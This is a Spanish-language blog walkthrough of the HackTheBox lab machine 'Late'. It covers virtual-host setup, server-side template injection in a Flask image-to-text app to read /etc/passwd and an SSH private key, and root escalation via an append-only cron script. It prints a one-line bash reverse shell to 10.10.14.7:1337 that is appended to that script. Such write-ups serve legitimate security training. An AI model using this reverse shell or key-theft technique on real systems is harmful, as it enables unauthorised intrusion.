<!DOCTYPE html><html lang="ja-JP" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.3" /><meta property="og:title" content="HackTheBox - Late" /><meta name="author" content="nik0" /><meta property="og:locale" content="ja_JP" /><meta name="description" content="Introducción" /><meta property="og:description" content="Introducción" /><link rel="canonical" href="/posts/HTB-Late/" /><meta property="og:url" content="/posts/HTB-Late/" /><meta property="og:site_name" content="Nik0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-23T14:10:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Late" /><meta name="twitter:site" content="@" /><meta name="twitter:creator" content="@nik0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"nik0"},"dateModified":"2022-07-23T14:10:00-04:00","datePublished":"2022-07-23T14:10:00-04:00","description":"Introducción","headline":"HackTheBox - Late","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/HTB-Late/"},"url":"/posts/HTB-Late/"}</script><title>HackTheBox - Late | Nik0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Nik0"><meta name="application-name" content="Nik0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/saikyosan.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Nik0</a></div><div class="site-subtitle font-italic">Ciberseguridad</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVOS</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/nik0sec" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="" aria-label="" class="order-4" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="https://www.linkedin.com/in/nik0/" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="" aria-label="" class="order-6" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" class="order-7" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" class="order-8" target="_blank" rel="noopener"> <i class=""></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox - Late</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Late</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> nik0 </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jul 23, 2022, 2:10 PM -0400" prep="on" > Jul 23, 2022 <i class="unloaded">2022-07-23T14:10:00-04:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1516 words">8 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/Late.png" alt="1" /></p><h2 id="introducción">Introducción</h2><p>En este write up de la máquina Late, veremos temas como:</p><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Host Virtuales<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Explotación de SSTI (Server Side Template Injection)<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Escalación de privilegios vía cronjobs</ul><h2 id="reconocimiento">Reconocimiento</h2><p>Primero vamos a ejecutar un escaneo con la herramienta Nmap con el siguiente comando:</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">nmap -sS -sV -T4 -vvv -n -oA nmap_scan late.htb
</span></pre></table></code></div></div><blockquote><p>La razón por la cual se ve un <code class="language-plaintext highlighter-rouge">late.htb</code> es porque convertí la IP de HTB a un dominio llamado así, igualmente esto se explicará más adelante.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/1.png" alt="1" /></p><p>Podemos observar dos puertos abiertos, sin embargo intenté buscar si habían exploits para esas versiones pero no se pudo encontrar nada, a excepción de SSH que existen unos scripts para enumerar usuarios pero no creo que la máquina vaya por ahí. Así que vamos a examinar el puerto 80 que corresponde a HTTP, por ende, es un sitio web el cual encontramos esto:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/2.png" alt="1" /></p><p>Ahora debemos examinar la página detenidamente y podemos encontrar en la parte de abajo de la página, un texto resaltado en azul:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/3.png" alt="1" /></p><p>Si clickeamos el texto azul, nos redirige a lo que parece ser un dominio, pero parece ser inválido.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/4.png" alt="1" /></p><p>¿Por qué ocurre esto?</p><p>Esto se debe a que en realidad es un host virtual, el cual actúa como “subdominio” dentro de una máquina host para que se parezca a varias máquinas host, no obstante, a continuación explicaré en detalle como es su funcionamiento y donde debemos configurarlo para que el dominio images.late.htb sea accesible.</p><blockquote><p>Si ya sabes como funciona un host virtual y como configurarlo, puedes saltarte este paso.</p></blockquote><h2 id="explicación-hosts-virtuales">Explicación Hosts Virtuales</h2><p>El virtualhost, o servidor virtual, es una forma de alojamiento web que permite que varias páginas web puedan funcionar en una misma máquina. Hay dos tipos de virtualhost:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Los que se basan en direcciones IP, donde cada página web tendrá una IP diferente.

Los que se basan en nombres de dominio, donde una sola dirección IP funcionan varias páginas web.
</pre></table></code></div></div><p>Aunque el navegador tendrá que diferenciar el tipo de virtualhost a la hora de gestionar la petición, la elección de una u otra no tiene ningún efecto para el usuario.</p><p>Ya que cada host virtual posee un nombre lógico de DNS, debemos configurar la IP de la máquina en conjunto con el nombre al dominio el cual queremos enlazar.</p><p>¿ Donde se configura el host virtual ?</p><p>Existe un archivo dentro de Linux llamado “hosts”, que se encuentra en la carpeta /etc y es extremadamente útil, ya que, almacena nombres de host con sus correspondientes direcciones IP. Con él se define qué nodos activan el nombre de host en una red. Al convertir los nombres de hosts en direcciones IP numéricas, el archivo hosts se convierte en una herramienta elemental de los protocolos de red, ya que solo puede trabajar con ellas. El archivo hosts se encuentra en todos los sistemas operativos de PC, Mac y dispositivos móviles, y solo pueden modificarlo los administradores del sistema. Cada vez que se quiere acceder a una página web, el equipo revisa primero el archivo hosts por si hubiera una entrada que le corresponda o una regla definida.</p><p>Con la información anteriormente mencionada, vamos a configurar la IP de la máquina en nuestro hosts, ubicado en /etc/hosts:</p><p>Ejecutamos el comando:</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">sudo nano /etc/hosts/
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/5.png" alt="1" /></p><p>Luego tendríamos que añadir la IP de la máquina, en conjunto con el dominio images.late.htb</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/6.png" alt="1" /></p><p>Como se puede observar en mi archivo hosts, ya tengo un dominio llamado “late.htb” asociada a esta IP, esto lo hago debido a que es mucho más sencillo tener que escribir un nombre de DNS que la IP de esta, para escaneos, enumeraciones, etc.</p><h2 id="obteniendo-acceso">Obteniendo Acceso</h2><p>Luego de configurar nuestro host virtual, ya podríamos acceder al dominio:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/7.png" alt="1" /></p><p>Lo primero que vemos es que aparentemente es un convertidor de imagen a texto que utiliza flask. Pero antes de explorar diversas formas de explotar este servicio, debemos examinar como funciona, que tipo de archivos acepta y que filtros posee para estos archivos.</p><p>Subimos una imagen con un texto, en mi caso será “Hola que tal Nico”</p><blockquote><div class="table-wrapper"><table><tbody><tr><td>IMPORTANTE: Puede que no resulte a la primera ya que el sistema es muy sensible con el tipo de fuente y tamaño de esta. Así que hay que ir probando hasta que salga, yo lo hice en LibreOffice Writer<td>Fuente: Liberation Mono Tamaño: 36 pt</table></div></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/8.png" alt="1" /></p><p>Luego clickeamos en “Scan Image” y nos devuelve un archivo llamado results.txt que contiene lo siguiente:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/9.png" alt="1" /></p><p>Ahora sabemos que la aplicación procesa una imagen que contenga texto y la convierte a texto plano, para luego devolverla en un archivo llamado “results.txt” con sintáxis HTML. Indagando que es Flask, se puede obtener información de que es un framework hecho en Python que a su vez, funciona como wrapper para servicios tales como Jinja, que son utilizados como motor de plantilla para la presentación de datos dinámicos dentro de las aplicaciones web.</p><p>Buscando información acerca de explotación de motores de plantilla, podemos encontrar una vulnerabilidad llamada SSTI (Server Side Template Injection) o en español “Inyección de plantillas del lado del servidor”. Esta vulnerabilidad se aprovecha de una implementación insegura de un motor de plantillas permitiendo atacar directamente los componentes internos de un servidor web objetivo, ya sea para exfiltrar datos u obtener ejecución de código remoto.</p><p>Para poder detectar si existe esta vulnerabilidad, debemos inyectar un comando para que el sistema lo procese y devuelva el resultado en el archivo de salida, eso si, no hay que confundir este ataque con una vulnerabilidad XSS. Pero de igual manera es fácil diferenciarlo ya que utilizaremos una operación matemática para la inyección.</p><p>Vamos a hacer el mismo proceso que el anterior, pero ahora le añadiremos un comando que contenga una multiplicación matemática entre dos simbolos de llaves:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/10.png" alt="1" /></p><p>Lo volvemos a escanear y nos devuelve esto:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/11.png" alt="1" /></p><p>Listo! tenemos una vulnerabilidad SSTI, ya que pudo procesar nuestro problema matemático y devolvió el resultado dentro del archivo “results.txt”. Ahora tenemos que ver como podemos tomar ventaja de este fallo, para que en vez de resolver problemas matemáticos nos devuelva por ejemplo información que está dentro del sistema.</p><p>Dentro de los articulos de <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"><strong>Hacktricks</strong></a> podemos encontrar diversas formas de explotar esta vulnerabilidad, pero nosotros solo necesitamos los comandos para inyección dentro del motor de plantilla de Jinja. Igualmente les dejo otro articulo donde se explica mejor como construir nuestro comando para posterior inyección <a href="https://infayer.com/archivos/803"><strong>SSTI2</strong></a></p><p>Escaneamos la imagen que tiene nuestra carga útil y nos va a listar lo que hay dentro de /etc/passwd:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/12.png" alt="1" /></p><p>Y nos devuelve el siguiente resultado:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/13.png" alt="1" /></p><p>Hay un usuario que nos llama la atención llamado “svc_acc” y se ubica en /home/svc_acc.</p><p>Como recordaremos, el puerto 22 correspondiente a SSH está habilitado, por ende, si podemos exfiltrar contenido dentro de /etc/passwd, ¿Por qué no exfiltrar la llave privada para poder autenticarse via SSH?</p><p>Ahora ejecutamos el mismo proceso, pero reemplazando el comando por el siguiente:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/14.png" alt="1" /></p><p>Y nos devuelve la llave:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/15.png" alt="1" /></p><p>Ahora nos vamos a nuestra máquina, creamos un archivo que se llame “id_rsa” y pegamos la llave ahí dentro, para luego aplicar los permisos correspondientes con el comando <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code> y nos conectariamos al servidor con el usuario svc_acc.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/16.png" alt="1" /></p><h2 id="escalando-privilegios">Escalando Privilegios</h2><p>Ya que tenemos nuestro acceso inicial, ahora podemos ir probando distintas técnicas de escalación de privilegios. La herramienta que utilizaremos se llama <a href="https://github.com/DominicBreuker/pspy"><strong>Pspy</strong></a> y su función principal es monitorizar los procesos que se están ejecutando en el sistema, sin necesidad de ser root.</p><p>Vamos a descargar esta herramienta en nuestra máquina, luego iniciaremos un servidor local con el comando <code class="language-plaintext highlighter-rouge">python3 -m http.server</code> y después en la máquina víctima nos dirigimos al directorio “/tmp” y descargamos el archivo con el comando wget.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/17.png" alt="1" /></p><p>Le brindamos los permisos adecuados con el comando <code class="language-plaintext highlighter-rouge">chmod +x pspy64</code> y ejecutamos.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/18.png" alt="1" /></p><p>Podemos observar que hay un <a href="https://www.ionos.es/digitalguide/hosting/cuestiones-tecnicas/cronjob/"><strong>cronjob</strong></a> en el PID número 2602 y que posee un UID=0 que quiere decir que lo ejecuta root, veamos para que sirve este archivo.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/19.png" alt="1" /></p><p>Este script lo que hace es dar una alerta cada vez que alguien establece una conexión via SSH, pero realmente no importa el contenido de este script. Esto sin duda da una posibilidad para inyectar una shell reversa, sin embargo, no tenemos permiso para editar este archivo.</p><p>Vamos a utilizar el comando <a href="https://www.reiser.cl/linux-comandos-lsattr-y-chattr-leer-y-establecer-atributos-especiales-append-only/"><strong>lsattr</strong></a> que permite listar los atributos asignados a los ficheros de un sistema Linux.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/20.png" alt="1" /></p><p>Aunque no podamos escribir normalmente dentro del archivo, si estamos permitidos para adjuntar archivos a este. Esto quiere decir que podemos crear otro archivo con nuestra shell reversa y adjuntarlo a ssh-alert.sh.</p><p>A continuación les voy a compartir una línea de comando la cual puede hacer esta tarea solo con ejecutarla, lo único que hay que modificar en el comando es la IP de la shell reversa.</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">touch archivo.txt &amp;&amp; echo "sh -i &gt;</span>&amp; /dev/tcp/10.10.14.7/1337 0&gt;&amp;1<span class="s2">" &gt;&gt; archivo.txt | cat /home/svc_acc/archivo.txt &gt;&gt; /usr/local/sbin/ssh-alert.sh
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/21.png" alt="1" /></p><p>Lo que hace este comando es crear un archivo llamado “archivo.txt”, para luego hacer un echo de la shell reversa a este mismo archivo y por último ejecuta un cat al archivo y envía el contenido de este a ssh-alert.sh, que se agregaría al final del script mencionado anteriormente.</p><p>Ponemos nuestro netcat a la escucha en el puerto 1337:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sample/Late/22.png" alt="1" /></p><p>Y listo, ya somos root ;)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Late - Nik0&url=/posts/HTB-Late/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Late - Nik0&u=/posts/HTB-Late/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Late - Nik0&url=/posts/HTB-Late/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Talkative/">HackTheBox - Talkative</a></ul></div><div id="access-tags"> <span>Tags Populares</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/bandit/">Bandit</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/0day/">0day</a> <a class="post-tag" href="/tags/anonymous/">Anonymous</a> <a class="post-tag" href="/tags/bountyhacker/">BountyHacker</a> <a class="post-tag" href="/tags/cybox/">Cybox</a> <a class="post-tag" href="/tags/dailybugle/">DailyBugle</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/hard/">Hard</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Seguir Leyendo</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Talkative/"><div class="card-body"> <span class="timeago small" > Aug 27, 2022 <i class="unloaded">2022-08-27T00:06:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Talkative</h3><div class="text-muted small"><p> Introducción En este write up de la máquina Talkative, veremos temas como: Explotación del servicio Jamovi WebHook como vía de explotación/escalación Escapando de contenedores Docker R...</p></div></div></a></div><div class="card"> <a href="/posts/THM-DailyBugle/"><div class="card-body"> <span class="timeago small" > May 31, 2021 <i class="unloaded">2021-05-31T11:38:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - Daily Bugle</h3><div class="text-muted small"><p> Introducción En este write up, veremos temas cómo vulnerabilidades SQL, crackear hashes y escalar privilegios via yum. Reconocimiento Utilizaremos la herramienta Nmap para este cometido con el...</p></div></div></a></div><div class="card"> <a href="/posts/THM-BountyHacker/"><div class="card-body"> <span class="timeago small" > May 28, 2021 <i class="unloaded">2021-05-28T11:38:00-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tryhackme - BountyHacker</h3><div class="text-muted small"><p> Introducción En este write up, veremos temas cómo reconocimiento, fuerza bruta a SSH y escalación de privilegios via sudo, en mi opinión personal una máquina bastante entretenida sin dejar de la...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/THM-DailyBugle/" class="btn btn-outline-primary" prompt="Antiguos"><p>Tryhackme - Daily Bugle</p></a> <a href="/posts/HTB-Talkative/" class="btn btn-outline-primary" prompt="Nuevos"><p>HackTheBox - Talkative</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/nik0sec">Nik0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">;).</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Tags Populares</h4><a class="post-tag" href="/tags/thm/">THM</a> <a class="post-tag" href="/tags/bandit/">Bandit</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/0day/">0day</a> <a class="post-tag" href="/tags/anonymous/">Anonymous</a> <a class="post-tag" href="/tags/bountyhacker/">BountyHacker</a> <a class="post-tag" href="/tags/cybox/">Cybox</a> <a class="post-tag" href="/tags/dailybugle/">DailyBugle</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/hard/">Hard</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script 